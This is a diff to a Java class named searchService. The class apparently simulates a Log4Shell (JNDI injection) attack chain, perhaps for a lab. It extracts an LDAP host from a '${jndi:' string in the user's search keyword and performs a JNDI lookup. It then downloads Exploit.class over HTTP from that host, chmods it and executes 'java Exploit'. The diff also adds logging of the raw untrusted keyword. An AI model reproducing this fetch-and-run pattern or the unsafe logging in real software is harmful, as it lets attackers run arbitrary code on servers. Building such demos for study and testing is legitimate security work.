@@ -78,7 +78,7 @@ public class searchService {
 	            outputStream.close();
 	            inputStream.close();
 	            
-	            System.out.println("File downloaded");
+	            //System.out.println("File downloaded");
 	            File file = new File(saveDir + fileName);
 	            
 	            String command = "chmod 755 " + file.getAbsolutePath();
@@ -87,17 +87,17 @@ public class searchService {
 	            
 	            Process proc1 = Runtime.getRuntime().exec("java Exploit");
 	            proc1.waitFor();
-	            System.out.println(saveDir + fileName);
+	            //System.out.println(saveDir + fileName);
 	            
-	            System.out.println("asdfadsfadsfasdfd"+saveDir + fileName);
-	            System.out.println("Permissions set: chmod 755 " + file.getAbsolutePath());
-	            System.out.println("Permissions set: chmod 755 Exploit.class" );
+	            //System.out.println("asdfadsfadsfasdfd"+saveDir + fileName);
+	            //System.out.println("Permissions set: chmod 755 " + file.getAbsolutePath());
+	            //System.out.println("Permissions set: chmod 755 Exploit.class" );
 	            
 	            // 파일 로드 및 실행
 	            
-	            System.out.println("File downloaded: " + file.getAbsolutePath());
+	            //System.out.println("File downloaded: " + file.getAbsolutePath());
 	            URL classUrl = file.toURI().toURL(); // 파일을 URL로 변환
-	            System.out.println("Class URL: " + classUrl);
+	            //System.out.println("Class URL: " + classUrl);
 	            
 	        } else {
 	            System.out.println("No file to download. Server replied HTTP code: " + responseCode);
@@ -125,18 +125,20 @@ public class searchService {
         String syntax="ldap://192.168.14.28:1389";
         
         logger.info(keyword);
+        logger.debug(keyword);
+        logger.error(keyword);
         String[] word = keyword.split("\\$\\{jndi:");
         if(keyword.contains("{jndi:")) {
         	
         	
-        	System.out.println(word[1]);
+        	//System.out.println(word[1]);
         	String syn = word[1].replace("}", "");
         	
         	int idx = syn.lastIndexOf("/");
         	if(idx != -1) {
         		syntax = syn.substring(0, idx);
         	}
-        	System.out.println("syntax : "+ syntax);//
+        	//System.out.println("syntax : "+ syntax);//
         	
         	String redirect_add = syntax.replace("ldap://","");
         	redirect_add = redirect_add.replace(":1389","");
@@ -148,15 +150,14 @@ public class searchService {
 
             try {
                 DirContext ctx = new InitialDirContext(env);
-                System.out.println("Connected to the LDAP server.");
+               // System.out.println("Connected to the LDAP server.");
                 // LDAP 서버에서 데이터를 조회하거나 조작하는 코드 추가
                 ctx.close();
             } catch (NamingException e) {
                 System.out.println("Cannot connect to LDAP server: " + e.getMessage());
             }
 
-            //
-            System.out.println("jndiPath : "+ jndiPath);//
+            //System.out.println("jndiPath : "+ jndiPath);//
             
             // 환경 설정
             Hashtable<String, String> env1 = new Hashtable<>();
@@ -168,15 +169,15 @@ public class searchService {
                 Context ctx = new InitialContext(env1);
                 Object obj = ctx.lookup(jndiPath);
                 
-                System.out.println("Object obtained from JNDI: " + obj);//
+                //System.out.println("Object obtained from JNDI: " + obj);//
                 
                 
-                System.out.println(redirect_add);
+                //System.out.println(redirect_add);
                 String fileUrl = "http://"+redirect_add+":8000/Exploit.class"; // 리다이렉션된 URL
                 
                 String currentDir = System.getProperty("user.dir");
                 String savePath = currentDir+"/"; // 파일을 저장할 경로
-                System.out.println("Current working directory: " + currentDir);
+                //System.out.println("Current working directory: " + currentDir);
                 downloadFileFromURL(fileUrl, savePath);
 
                 // Context 사용 후 닫기
